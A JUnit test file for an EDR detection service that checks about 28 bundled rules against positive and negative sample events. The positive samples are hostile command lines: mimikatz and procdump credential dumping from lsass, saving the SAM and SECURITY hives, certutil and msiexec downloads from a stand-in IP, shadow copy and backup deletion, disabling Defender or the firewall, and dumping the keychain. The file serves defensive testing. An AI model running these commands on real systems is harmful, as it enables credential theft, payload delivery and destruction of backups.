package com.edrdog.detectorservice.rule;

import com.edrdog.detectorservice.dto.Alert;
import com.edrdog.detectorservice.support.TestEvents;
import com.edrdog.schema.Event;
import com.edrdog.schema.EventTypes;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;

import java.io.IOException;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 번들 룰(src/main/resources/rules) 전부에 대해 걸려야 할 이벤트와 걸리면 안 되는 이벤트를 하나 이상씩 확인한다.
 * 에이전트가 실제로 보내는 형태를 따른다: process 는 파일명, cmdline 의 첫 토큰은 전체 경로,
 * powershell/cmd 같은 인터프리터는 script 타입, file 의 cmdline 은 전체 경로.
 */
class BundledRulesTest {

    private static final DataRules BUNDLED = new DataRules("");

    private record Case(String ruleId, String severity, List<Event> positives, List<Event> negatives) {
    }

    private static Event proc(String image, String cmdline) {
        return TestEvents.of("h", EventTypes.PROCESS, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
    }

    private static Event script(String image, String cmdline) {
        return TestEvents.of("h", EventTypes.SCRIPT, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
    }

    private static Event file(String path) {
        String name = path.substring(path.lastIndexOf('\\') + 1);
        return TestEvents.of("h", EventTypes.FILE, 1, name, null, path, null, 0, null, "{\"action\":\"CREATE\"}", null, "t");
    }

    private static Event dns(String domain) {
        return TestEvents.of("h", EventTypes.DNS, 1, "app.exe", null, null, null, 0, domain, null, null, "t");
    }

    private static final String SYS = "C:\\Windows\\System32\\";
    private static final String PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe ";

    private static Case c(String id, String severity, List<Event> pos, List<Event> neg) {
        return new Case(id, severity, pos, neg);
    }

    static final List<Case> CASES = List.of(
            c("MIMIKATZ_COMMAND_LINE", Alert.SEV_HIGH,
                    List.of(proc("mimikatz.exe", "C:\\Tools\\mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
                            proc("a.exe", "C:\\Temp\\a.exe lsadump::sam"),
                            proc("mimikatz.exe", "C:\\Tools\\mimikatz.exe")),
                    List.of(proc("notepad.exe", "C:\\Windows\\notepad.exe C:\\notes\\todo.txt"),
                            proc("git.exe", "C:\\Git\\git.exe commit -m \"fix mimikatz rule\""),
                            proc("cargo", "/usr/bin/cargo test token::tests"))),
            c("CERTUTIL_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(proc("certutil.exe", SYS + "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe")),
                    List.of(proc("certutil.exe", SYS + "certutil.exe -hashfile C:\\a.txt SHA256"),
                            proc("xcertutil.exe", SYS + "xcertutil.exe -urlcache -f http://203.0.113.9/a.exe a.exe"))),
            c("BITSADMIN_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(proc("bitsadmin.exe", SYS + "bitsadmin.exe /transfer job http://203.0.113.9/a.exe C:\\a.exe")),
                    List.of(proc("bitsadmin.exe", SYS + "bitsadmin.exe /list /allusers"),
                            proc("curl.exe", SYS + "curl.exe /transfer job http://203.0.113.9/a.exe"))),
            c("MSHTA_REMOTE_HTA", Alert.SEV_MEDIUM,
                    List.of(proc("mshta.exe", SYS + "mshta.exe https://203.0.113.9/x.hta")),
                    List.of(proc("mshta.exe", SYS + "mshta.exe C:\\apps\\local.hta"))),
            c("POWERSHELL_ENCODED_COMMAND", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-NoP -enc <redacted>"),
                            script("powershell.exe", PS + "-e JABzAD0ATgBlAHcA")),
                    List.of(script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"),
                            script("powershell.exe", PS + "-ExecutionPolicy RemoteSigned -enc <redacted>"),
                            script("cmd.exe", SYS + "cmd.exe /c echo -enc <redacted>"))),
            c("POWERSHELL_DEFENDER_EXCLUSION", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "Add-MpPreference -ExclusionPath C:\\Temp")),
                    List.of(script("powershell.exe", PS + "Get-MpPreference"))),
            c("NETSH_FIREWALL_DISABLE", Alert.SEV_MEDIUM,
                    List.of(proc("netsh.exe", SYS + "netsh.exe advfirewall set allprofiles state off")),
                    List.of(proc("netsh.exe", SYS + "netsh.exe advfirewall show allprofiles"))),
            c("BCDEDIT_BOOT_TAMPER", Alert.SEV_MEDIUM,
                    List.of(proc("bcdedit.exe", SYS + "bcdedit.exe /set {default} safeboot network")),
                    List.of(proc("bcdedit.exe", SYS + "bcdedit.exe /enum"))),
            c("MSIEXEC_WEB_INSTALL", Alert.SEV_MEDIUM,
                    List.of(proc("msiexec.exe", SYS + "msiexec.exe /i http://203.0.113.9/a.msi /q"),
                            script("cmd.exe", SYS + "cmd.exe /c msiexec /q /i http://203.0.113.9/a.msi")),
                    List.of(proc("msiexec.exe", SYS + "msiexec.exe /i C:\\pkg\\app.msi"))),
            c("REG_DUMP_SENSITIVE_HIVES", Alert.SEV_HIGH,
                    List.of(proc("reg.exe", SYS + "reg.exe save HKLM\\SAM C:\\temp\\sam.save"),
                            proc("reg.exe", SYS + "reg.exe save \"HKLM\\SYSTEM\" C:\\temp\\sys.save"),
                            proc("reg.exe", SYS + "reg.exe save HKEY_LOCAL_MACHINE\\SECURITY C:\\temp\\sec.save")),
                    List.of(proc("reg.exe", SYS + "reg.exe query HKLM\\Software\\Microsoft"),
                            proc("reg.exe", SYS + "reg.exe save HKCU\\Software\\Foo C:\\a.hiv"),
                            proc("reg.exe", SYS + "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Services\\Foo C:\\b.reg"),
                            proc("reg.exe", SYS + "reg.exe export HKLM\\SOFTWARE\\Samsung C:\\b.reg"),
                            proc("reg.exe", SYS + "reg.exe save HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Security x.hiv"))),
            c("POWERSHELL_SHADOWCOPY_DELETE", Alert.SEV_HIGH,
                    List.of(script("powershell.exe", PS + "Get-WmiObject Win32_ShadowCopy | ForEach-Object {$_.Delete()}")),
                    List.of(script("powershell.exe", PS + "Get-WmiObject Win32_ShadowCopy"))),
            c("WBADMIN_DELETE_ALL_BACKUPS", Alert.SEV_HIGH,
                    List.of(proc("wbadmin.exe", SYS + "wbadmin.exe delete backup -keepVersions:0 -quiet")),
                    List.of(proc("wbadmin.exe", SYS + "wbadmin.exe get versions"),
                            proc("wbadmin.exe", SYS + "wbadmin.exe delete backup -keepVersions:3"))),
            c("PROCDUMP_LSASS", Alert.SEV_HIGH,
                    List.of(proc("procdump.exe", "C:\\Tools\\procdump.exe -accepteula -ma lsass.exe C:\\temp\\l.dmp"),
                            proc("procdump64.exe", "C:\\Tools\\procdump64.exe /ma lsass.exe C:\\temp\\l.dmp")),
                    List.of(proc("procdump.exe", "C:\\Tools\\procdump.exe -ma notepad.exe C:\\n.dmp"),
                            proc("bash", "/bin/bash -c ls -ma /tmp"),
                            proc("git.exe", "C:\\Git\\git.exe log -mp -- lsfoo"),
                            proc("pd.exe", "C:\\Tools\\pd.exe -ma lsass.exe C:\\temp\\l.dmp"))),
            c("NET_USER_ADD", Alert.SEV_MEDIUM,
                    List.of(proc("net.exe", SYS + "net.exe user hacker Passw0rd /add")),
                    List.of(proc("net.exe", SYS + "net.exe view \\\\server"),
                            proc("whoami.exe", SYS + "whoami.exe user add"))),
            c("SCHTASKS_CREATE_TEMP", Alert.SEV_MEDIUM,
                    List.of(proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\Users\\a\\AppData\\Local\\Temp\\x.exe /sc once /st 00:00"),
                            proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\Users\\a\\AppData\\Local\\Temp\\x.exe /sc once")),
                    List.of(proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\app\\x.exe /sc daily"))),
            c("NTDSUTIL_SNAPSHOT_MOUNT", Alert.SEV_MEDIUM,
                    List.of(proc("ntdsutil.exe", SYS + "ntdsutil.exe snapshot \"mount abc\" quit quit"),
                            proc("ntdsutil.exe", SYS + "ntdsutil.exe ac i ntds ifm create full C:\\x")),
                    List.of(proc("ntdsutil.exe", SYS + "ntdsutil.exe help"))),
            c("MACOS_CSRUTIL_DISABLE", Alert.SEV_MEDIUM,
                    List.of(proc("csrutil", "/usr/bin/csrutil disable")),
                    List.of(proc("csrutil", "/usr/bin/csrutil status"))),
            c("MACOS_XATTR_REMOVE_QUARANTINE", Alert.SEV_MEDIUM,
                    List.of(proc("xattr", "/usr/bin/xattr -d com.apple.quarantine /Users/a/Downloads/app.app")),
                    List.of(proc("xattr", "/usr/bin/xattr -l /Users/a/file"))),
            c("MACOS_TMUTIL_DELETE_BACKUP", Alert.SEV_MEDIUM,
                    List.of(proc("tmutil", "/usr/bin/tmutil delete /Volumes/Backup/2026-11-01")),
                    // 파일 이름에 tmutil, delete 가 들어 있을 뿐인 명령 (KISA 자체 시험 2026-11-10 실제 오탐)
                    List.of(proc("tmutil", "/usr/bin/tmutil listbackups"),
                            proc("mv", "/bin/mv D08-tmutil-delete.sh D08.sh"),
                            proc("sed", "/usr/bin/sed -n s/^# id: //p /x/scenarios/D08-tmutil-delete.sh"))),
            c("MACOS_SYSADMINCTL_ADD_ADMIN", Alert.SEV_MEDIUM,
                    List.of(proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -admin -password <redacted>"),
                            proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -password <redacted> -admin")),
                    List.of(proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -password <redacted>"))),
            c("MACOS_DSCL_ADD_ADMIN", Alert.SEV_MEDIUM,
                    List.of(proc("dscl", "/usr/bin/dscl . -append /Groups/admin GroupMembership bob")),
                    List.of(proc("dscl", "/usr/bin/dscl . -read /Users/bob"))),
            c("MACOS_KEYCHAIN_DUMP", Alert.SEV_MEDIUM,
                    List.of(proc("security", "/usr/bin/security dump-keychain -d login.keychain"),
                            proc("security", "/usr/bin/security find-certificate -a -p")),
                    List.of(proc("security", "/usr/bin/security list-keychains"),
                            proc("othertool", "/usr/bin/othertool find-certificate"))),
            c("MACOS_PLISTBUDDY_LAUNCHD_PERSISTENCE", Alert.SEV_MEDIUM,
                    List.of(proc("PlistBuddy", "/usr/libexec/PlistBuddy -c \"Add :RunAtLoad bool true\" /Library/LaunchAgents/x.plist")),
                    List.of(proc("PlistBuddy", "/usr/libexec/PlistBuddy -c \"Print :CFBundleVersion\" /Applications/a.app/Info.plist"))),
            c("MACOS_DISABLE_SECURITY_TOOLS", Alert.SEV_MEDIUM,
                    List.of(proc("launchctl", "/bin/launchctl unload /Library/LaunchDaemons/com.google.santad.plist"),
                            proc("spctl", "/usr/sbin/spctl --master-disable")),
                    List.of(proc("launchctl", "/bin/launchctl unload /Library/LaunchAgents/com.example.app.plist"),
                            proc("spctl", "/usr/sbin/spctl --status"))),
            c("DNS_TOR_GATEWAY", Alert.SEV_MEDIUM,
                    List.of(dns("abcdefgh.onion.to"), dns("hidden.onion")),
                    List.of(dns("example.com"), dns("bunion.org"))),
            c("DNS_MEGA_USERSTORAGE", Alert.SEV_MEDIUM,
                    List.of(dns("g.api.userstorage.mega.co.nz")),
                    List.of(dns("mega.nz"))),
            c("FILE_MIMIKATZ_ARTIFACTS", Alert.SEV_MEDIUM,
                    List.of(file("C:\\Users\\a\\ticket.kirbi")),
                    List.of(file("C:\\Users\\a\\notes.txt"))),
            c("FILE_LSASS_DUMP_NAME", Alert.SEV_MEDIUM,
                    List.of(file("C:\\Temp\\lsass.dmp"), file("C:\\Temp\\lsass_261110_101010.dmp")),
                    List.of(file("C:\\Temp\\report.dmp"))));

    private static final Map<String, SigmaRule> BY_ID = BUNDLED.current().stream()
            .collect(Collectors.toMap(SigmaRule::ruleId, r -> r));

    static Stream<Case> cases() {
        return CASES.stream();
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("cases")
    @DisplayName("번들 룰: 걸릴 이벤트는 걸리고 아닌 것은 안 걸린다")
    void rule_firesOnPositives_notOnNegatives(Case c) {
        SigmaRule rule = BY_ID.get(c.ruleId());

        assertThat(rule).as("번들에 %s 가 있다", c.ruleId()).isNotNull();
        assertThat(rule.severity()).isEqualTo(c.severity());
        for (Event e : c.positives()) {
            assertThat(rule.matches(e)).as("걸려야 한다: %s", e.getCmdline() + e.getDomain()).isTrue();
        }
        for (Event e : c.negatives()) {
            assertThat(rule.matches(e)).as("걸리면 안 된다: %s", e.getCmdline() + e.getDomain()).isFalse();
        }
    }

    @Test
    @DisplayName("번들 룰은 전부 읽히고, 룰마다 테스트 케이스가 있다 (20~30개)")
    void everyBundledRule_isLoaded_andTested() throws IOException {
        int files = new PathMatchingResourcePatternResolver().getResources("classpath*:rules/*.yml").length;
        Set<String> tested = CASES.stream().map(Case::ruleId).collect(Collectors.toSet());

        assertThat(BUNDLED.current()).hasSize(files);
        assertThat(BY_ID.keySet()).isEqualTo(tested);
        assertThat(files).isBetween(20, 30);
    }

    @Test
    @DisplayName("종료(kill)를 권고하는 번들 룰은 명백히 악성인 다섯 개뿐이고 CRITICAL 은 없다")
    void onlyClearlyMaliciousRules_recommendKill() {
        Set<String> high = BUNDLED.current().stream()
                .filter(r -> !r.severity().equals(Alert.SEV_MEDIUM))
                .peek(r -> assertThat(r.severity()).isEqualTo(Alert.SEV_HIGH))
                .map(SigmaRule::ruleId).collect(Collectors.toSet());

        assertThat(high).containsExactlyInAnyOrder("MIMIKATZ_COMMAND_LINE", "REG_DUMP_SENSITIVE_HIVES",
                "POWERSHELL_SHADOWCOPY_DELETE", "WBADMIN_DELETE_ALL_BACKUPS", "PROCDUMP_LSASS");
    }

    @Test
    @DisplayName("Rules.evaluate 를 거치면 번들 룰이 알림이 되고 high 는 kill, 나머지는 notify")
    void viaRules_alertCarriesRuleMetadata() {
        Alert kill = Rules.evaluate(List.of(), CASES.get(0).positives().get(0), BUNDLED.current()).orElseThrow();
        Alert notify = Rules.evaluate(List.of(), CASES.get(1).positives().get(0), BUNDLED.current()).orElseThrow();

        assertThat(kill.ruleId()).isEqualTo("MIMIKATZ_COMMAND_LINE");
        assertThat(kill.mitre()).isEqualTo("T1003.001");
        assertThat(kill.action()).isEqualTo(Alert.ACTION_KILL);
        assertThat(notify.ruleId()).isEqualTo("CERTUTIL_DOWNLOAD");
        assertThat(notify.mitre()).isEqualTo("T1105");
        assertThat(notify.action()).isEqualTo(Alert.ACTION_NOTIFY);
    }
}
